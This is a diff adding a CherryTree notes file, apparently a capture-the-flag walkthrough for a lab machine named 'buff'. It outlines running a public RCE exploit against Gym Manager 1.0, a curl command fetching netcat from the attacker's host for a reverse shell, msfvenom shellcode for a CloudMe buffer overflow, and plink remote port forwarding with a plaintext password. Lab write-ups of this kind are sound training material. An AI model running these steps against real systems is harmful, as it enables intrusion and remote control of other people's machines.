@@ -1,0 +1,28 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="buff" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1597962852.76" ts_lastsave="1597963441.84" unique_id="1">
+		<rich_text>port 8080 open
+
+find out what server is running on.  “Gym manager 1.0”, found rce exploit
+
+run </rich_text>
+		<rich_text weight="heavy">python 48506.py http://10.10.10.198:8080/</rich_text>
+		<rich_text>
+
+</rich_text>
+		<rich_text weight="heavy">curl </rich_text>
+		<rich_text link="webs http://10.10.15.45/nc.exe" weight="heavy">http://10.10.15.45/nc.exe</rich_text>
+		<rich_text weight="heavy"> -o nc.exe </rich_text>
+		<rich_text>to download netcat and plink for reverse shell and port forwarding
+
+find cloudme service running, find buffer overflow CVE, need to port forward
+
+create shellcode with msfvenom and paste into CVE (full command is in CVE)
+
+on the remote machine do plink.exe -l root -pw cronaldo12 10.10.15.46 -R 8888:127.0.0.1:8888 to remote port forward
+
+create nc listener on kali machine
+
+once logged in on port forwarded session, run CVE</rich_text>
+	</node>
+</cherrytree>
